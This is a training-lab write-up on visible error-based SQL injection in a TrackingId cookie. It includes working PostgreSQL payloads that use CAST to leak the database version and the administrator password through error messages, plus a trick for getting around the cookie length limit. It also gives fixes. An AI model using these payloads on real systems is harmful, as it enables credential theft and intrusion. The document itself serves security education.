# Lab: Visible error-based SQL injection

**Category:** SQL Injection\
**Difficulty:** Practitioner\
**Objective:** Leak the administrator's password via verbose error messages and log in.

## 0. Attacker mindset

When the application returns verbose SQL errors in the response, the error message itself can become the output channel. Instead of inferring data bit by bit, I can use `CAST` to force a type conversion error that embeds the data I want directly in the error string.
However, the cookie has a 95-character limit. My original TrackingId was too long to fit a full payload. The solution was to replace the TrackingId with a single character (`1`) to free up space for the injection.

## 1. What is the vulnerability?

The `TrackingId` cookie is concatenated into a SQL query without sanitization. The database (PostgreSQL) returns detailed error messages including parts of the failed query. By injecting a `CAST` that attempts to convert a string (the password) to an integer, the application leaks the string value in the `invalid input syntax for type integer` error.

## 2. How did I exploit it?

### Step 1 — Bypass the character limit

The original TrackingId (`iREZekvIAsJ5e3Bl`, 16 characters) caused all payloads to be truncated at position 95. Replaced it with `1` to free up space for the injection.

### Step 2 — Confirm the injection is SQL and identify the database

```
TrackingId=1' AND 1=CAST(version() AS int)--
```
Error returned: `ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)..."`

Confirmed PostgreSQL and that verbose errors are returned.

### Step 3 — Extract the password

```
TrackingId=1' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Error returned: `ERROR: invalid input syntax for type integer: "odwhp2ywukks4ptuv2of"`

The password appeared directly in the error message.

### Step 4 — Log in

Used `administrator`:`odwhp2ywukks4ptuv2of`. Lab solved.

## 3. Impact

- Complete password leak in a single request via verbose error messages
- No need for character-by-character extraction or Intruder
- The application accepts arbitrary TrackingId values without validation, allowing the attacker to replace a valid N-character ID with a single character to bypass the character limit
- Demonstrates that misconfigured error reporting can turn a blind SQLi into a direct data leak

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all SQL operations
- Do not concatenate user input into queries
- Validate the TrackingId format on the server (minimum length, allowed characters, expected pattern like UUID or hash). Reject requests with invalid TrackingId values before they reach the database
- Configure the application to return generic error pages — never expose database error details to the client


**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
